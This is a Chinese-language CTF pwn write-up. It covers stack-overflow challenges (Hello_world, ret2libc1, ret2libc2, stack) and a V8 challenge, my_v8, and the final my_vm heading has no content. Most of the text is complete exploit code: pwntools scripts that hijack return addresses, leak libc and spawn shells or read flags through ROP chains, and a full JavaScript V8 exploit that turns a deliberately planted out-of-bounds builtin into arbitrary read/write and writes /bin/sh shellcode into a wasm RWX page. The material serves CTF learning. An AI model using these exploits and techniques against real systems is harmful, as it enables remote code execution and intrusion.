# Hello_world
签到题，利用栈溢出漏洞劫持返回函数至`backdoors`即可。
exp:
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = False
ip = 'node2.anna.nssctf.cn'
port = 28485
if local:
	p = process('./Hello_world')
	pwnlib.gdb.attach(p, 'b func1')
else:
	p = remote(ip, port)
	# p = websocket()

payload = b'a' * (0x20 + 8) + b'\xc5'
p.send(payload)
p.interactive()
```
# ret2libc1
菜单题，可以找到栈溢出漏洞在`shop`函数里
![[Pasted image 20250302221923.png]]
`main`函数中可以找到当输入7时会执行`see_it`函数，可以刷钱，刷了钱后便可以买下商店触发栈溢出漏洞。
![[Pasted image 20250302222124.png]]
利用该漏洞可以泄漏`libc`基址构造`rop`。
exp:
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = False
ip = 'node2.anna.nssctf.cn'
port = 28561
if local:
	p = process('./attachment')
	pwnlib.gdb.attach(p, 'b ')
else:
	p = remote(ip, port)
	# p = websocket()

elf = ELF('./attachment')
libc = ELF('./libc.so.6')

ret = 0x400579
pop_rdi = 0x400d73

p.recvuntil(b'6.check youer money\n')
p.sendline(b'7')
p.recvuntil(b'exchange?')
p.sendline(b'1000')
p.recvuntil(b'6.check youer money\n')
p.sendline(b'5')
p.recvuntil(b'name it!!!\n')

payload = b'a' * (0x40 + 8)
payload += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x400b1e)

p.sendline(payload)

puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info('puts_addr: ' + hex(puts_addr))

libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

payload = b'a' * (0x40 + 8)
payload += p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
p.recvuntil(b'name it!!!\n')
p.sendline(payload)

p.interactive()
```

# ret2libc2
`one_gadget`类型的题目。
需要先想办法泄漏`libc`基址，因为不能直接控制`pop rdi; ret` 需要找别的方法。
![[Pasted image 20250302222628.png]]
能想到的方法就是利用`printf`函数将函数的`got`泄漏出来
![[Pasted image 20250302222757.png]]
从汇编可以看出这里将`rbp - 0x10`赋给`rax`，所以在第一次`read`时将某一函数的`got + 0x10`放在此处即可，如下图
![[Pasted image 20250302223055.png]]
泄漏之后可以算出`libc`基址，查找使用哪个`gadget`
![[Pasted image 20250302223226.png]]
可以发现都需要`rbp-0xXX`可以执行，可以看到有`leave ret`，将`rbp`迁移到一个可执行的位置即可。
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = True
ip = 'node2.anna.nssctf.cn'
port = 28713
if local:
	p = process('./ret2libc2')
	pwnlib.gdb.attach(p, 'b func')
else:
	p = remote(ip, port)
	# p = websocket()

elf = ELF('./ret2libc2')
libc = ELF('./libc.so.6')
ret = 0x40101a

p.recvuntil(b'magic')
payload = p64(elf.got['puts']) + b'\x00' * 0x28 + p64(elf.got['setvbuf'] + 0x10) + p64(0x401223)
p.send(payload)

p.recvuntil(b'\n')
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.success('puts_addr: ' + hex(puts_addr))
libc_base = puts_addr - libc.symbols['setvbuf']
log.success('libc_base: ' + hex(libc_base))

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

ogg = libc_base + 0xebc81

p.recvuntil(b'magic')
payload = b'\x00' * (0x30) + p64(elf.bss() + 0x100) + p64(ogg)

p.send(payload)

p.interactive()
```
# stack
反编译后的伪代码看不出什么，需要直接看汇编
![[Pasted image 20250302223649.png]]
主函数`print`了两个``msg``以及一个`rsp`指针，然后`read`之后跳转到`rsp`指的地方
![[Pasted image 20250302223809.png]]
再看看`print`函数以及`gadgets`函数，利用这些可以做到控制`rax,rsi,rdi,rbx,r13,r15`，
![[Pasted image 20250302224032.png]]
接受一下泄漏的地址可以发现是栈地址，可以把文件路径存在这里后面调用。
调试很久本打算控制寄存器调用`execve`直接`binsh`，但发现不能控制`rdx`用不了`execve`（也可能我哪里弄错了），最后选择构造`orw`。
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = True
ip = 'node2.anna.nssctf.cn'
port = 28073
if local:
	p = process('./stack')
	pwnlib.gdb.attach(p, 'b *0x401033')
else:
	p = remote(ip, port)
	# p = websocket()  

ret = 0x401013
elf = ELF('./stack')

p.recvuntil(b'\x20\x29\x0a')
recv = u64(p.recv(6).ljust(8, b'\x00'))
log.success(f'recv: {hex(recv)}')

p.recvuntil(b'\x3e\x3e\x20')
payload = flat([
	# open
	0x401017,
	0,
	0,
	'./flag\x00\x00', # 将路径存在泄漏的栈地址
	0x401017,
	0,
	0,
	0,
	2,                # r13赋值open的系统调用，后面赋给rax
	0x40100c,
	0x401017,
	0,
	0,
	0,
	0x401017,
	0,
	recv,             # rdi赋值flag地址
	0,
	0,
	0x401077,         # syscall系统调用
	# read
	0x401017,
	0,
	0,
	0,                # r13赋值read的系统调用
	0x40100c,
	0x401017,
	0,
	0,
	0,
	0x401017,
	0x4023d0,         # rsi赋值缓存地址
	3,                # rdi赋值fd文件符
	0,
	0,
	0x401077,         # syscall
	# write
	0x401017,
	0,
	0,
	1,                # write系统调用
	0x40100c,
	0x401017,
	0,
	0,
	0,
	0x401017,
	0x402000 - 0x10, # rsi缓存地址
	1,               # rdi fd文件符
	0,
	0,
	0x401077,
])
p.sendline(payload)

p.interactive()
```
# my_v8
环境搭建遇到的问题比做题遇到的问题还多，具体看这边[[v8]]。
首先看一下diff文件
```diff
diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
index b027d36b5e9..406ca1eac98 100644
--- a/src/bootstrapper.cc
+++ b/src/bootstrapper.cc
@@ -1666,6 +1666,10 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           false);
     SimpleInstallFunction(isolate_, proto, "copyWithin",
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
+    SimpleInstallFunction(isolate_, proto, "Myread",
+                          Builtins::kMyread, 1, false);
+    SimpleInstallFunction(isolate_, proto, "Mywrite",
+                          Builtins::kMywrite, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
     SimpleInstallFunction(isolate_, proto, "find",
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 8df340ece7a..604a876df01 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -361,6 +361,39 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
   return *final_length;
 }
 }  // namespace
+BUILTIN(Myread) {
+  uint32_t len = args.length();
+  if( len > 1 ) return ReadOnlyRoots(isolate).undefined_value();
+  Handle<JSReceiver> receiver;
+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+         isolate, receiver, Object::ToObject(isolate,args.receiver()));
+  Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+  FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+  uint32_t length = static_cast<uint32_t>(array->length()->Number());
+  return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
+}
+
+BUILTIN(Mywrite) {
+  uint32_t len = args.length();
+  if( len > 2 ) return ReadOnlyRoots(isolate).undefined_value();
+  Handle<JSReceiver> receiver;
+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+         isolate, receiver, Object::ToObject(isolate,args.receiver()));
+  Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+  FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+  uint32_t length = static_cast<uint32_t>(array->length()->Number());
+   
+  if( len == 2) {
+    Handle<Object> value;
+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+            isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
+    elements.set(length,value->Number());
+    return ReadOnlyRoots(isolate).undefined_value();
+  }
+  else{
+    return ReadOnlyRoots(isolate).undefined_value();
+  }
+}
 
 BUILTIN(ArrayPush) {
   HandleScope scope(isolate);
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 04472309fc0..752a08ce7ca 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -368,6 +368,8 @@ namespace internal {
   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+  CPP(Myread)                                                                  \
+  CPP(Mywrite)                                                                 \
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index ed1e4a5c6d8..11b28a92e13 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1678,6 +1678,10 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Boolean();
     case Builtins::kArrayPrototypeSplice:
       return Type::Receiver();
+    case Builtins::kMyread:
+      return Type::Receiver();
+    case Builtins::kMywrite:
+      return Type::Receiver();
     case Builtins::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
 

```
这个diff文件新定义了两个数组可用的函数，一个是Myread函数，不能输入参数，返回数组的最后一个值；一个是Mywrite函数，有一个参数，将这个值写入数组的最后。这两个函数都有漏洞，分别的实际返回的是数组的map以及修改数组的map，利用这个漏洞可以做到任意地址的读写
构造一个fake_object，形态如下:
```java
var fake_array = [  
  float_array_map, // 这里填写之前oob泄露的某个float数组对象的map  
  0,  
  i2f(0x4141414141414141), <-- elements指针  
  i2f(0x400000000)  
];
```
我们很容易通过addreOf(fake_object)-0x20计算得出存储数组元素内容的内存地址，然后通过fakeObject函数就可以将这个地址强制转换成一个恶意构造的对象fake_object了。

后续如果我们访问fake_object[0]，实际上访问的就是其elements指针即0x4141414141414141+0x10指向的内存内容了，而这个指针内容是我们完全可控的，因此可以写为我们想要访问的任意内存地址。利用上述一套s操作，我们就实现了任意地址读写。这一过程中的内存布局转换如下图所示：
![[Pasted image 20250316171258.png]]
有这个漏洞，有两种利用方法，一种是使用传统的堆利用漏洞，泄漏libc地址修改free_hook，一方面我现在还没学过，另一方面这题没给libc版本，这里用另一个方法Wasm
Wasm简单来说就是让java直接执行高级语言生成的机器码的一种技术
有一个网站：[https://wasdk.github.io/WasmFiddle/](https://wasdk.github.io/WasmFiddle/)
由于安全性的考虑不，浏览器不允许通过wasm直接调用系统函数，但可以先将无害的wasm写入，然后通过上面的任意写的漏洞，将shellcode写入wasm,就可以再调用wasm时，实际调用的就是shellcode了。
exp:
```
// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××

var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

// 浮点数转换为64位无符号整数
function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}
// 64位无符号整数转为浮点数
function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}
// 64位无符号整数转为16进制字节串
function hex(i)
{
    return i.toString(16).padStart(16, "0");
}

// ××××××××2. addressOf和fakeObject的实现××××××××
var obj = {"a": 1};
var obj_array = [obj];
var float_array = [1.1];

var obj_array_map = obj_array.Myread();
var float_array_map = float_array.Myread();

// 泄露某个object的地址
function addressOf(obj_to_leak)
{
    obj_array[0] = obj_to_leak;
    obj_array.Mywrite(float_array_map);
    let obj_addr = f2i(obj_array[0]) - 1n;
    obj_array.Mywrite(obj_array_map); // 还原array类型，以便后续继续使用
    return obj_addr;
}

// 将某个addr强制转换为object对象
function fakeObject(addr_to_fake)
{
    float_array[0] = i2f(addr_to_fake + 1n);
    float_array.Mywrite(obj_array_map);
    let faked_obj = float_array[0];
    float_array.Mywrite(float_array_map); // 还原array类型，以便后续继续使用
    return faked_obj;
}


var fake_array = [
    float_array_map,
    i2f(0n),
    i2f(0x41414141n),
    i2f(0x1000000000n),
    1.1,
    2.2,
];

var fake_array_addr = addressOf(fake_array);
var fake_object_addr = fake_array_addr - 0x40n + 0x10n;
var fake_object = fakeObject(fake_object_addr);

function read64(addr)
{
    fake_array[2] = i2f(addr - 0x10n + 0x1n);
    let leak_data = f2i(fake_object[0]);
    console.log("[*] leak from: 0x" +hex(addr) + ": 0x" + hex(leak_data));
    return leak_data;
}

function write64(addr, data)
{
    fake_array[2] = i2f(addr - 0x10n + 0x1n);
    fake_object[0] = i2f(data);
    console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));    
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;

var f_addr = addressOf(f);
console.log("[*] leak wasm func addr: 0x" + hex(f_addr));

var shared_info_addr = read64(f_addr + 0x18n) - 0x1n;
var wasm_exported_func_data_addr = read64(shared_info_addr + 0x8n) - 0x1n;
var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;
var rwx_page_addr = read64(wasm_instance_addr + 0x88n);

console.log("[*] leak rwx_page_addr: 0x" + hex(rwx_page_addr));

var shellcode = [
    0x2fbb485299583b6an,
    0x5368732f6e69622fn,
    0x050f5e5457525f54n
];

var data_buf = new ArrayBuffer(24);
var data_view = new DataView(data_buf);
var buf_backing_store_addr = addressOf(data_buf) + 0x20n;

write64(buf_backing_store_addr, rwx_page_addr);
data_view.setFloat64(0, i2f(shellcode[0]), true);
data_view.setFloat64(8, i2f(shellcode[1]), true);
data_view.setFloat64(16, i2f(shellcode[2]), true);


f();
```
# my_vm
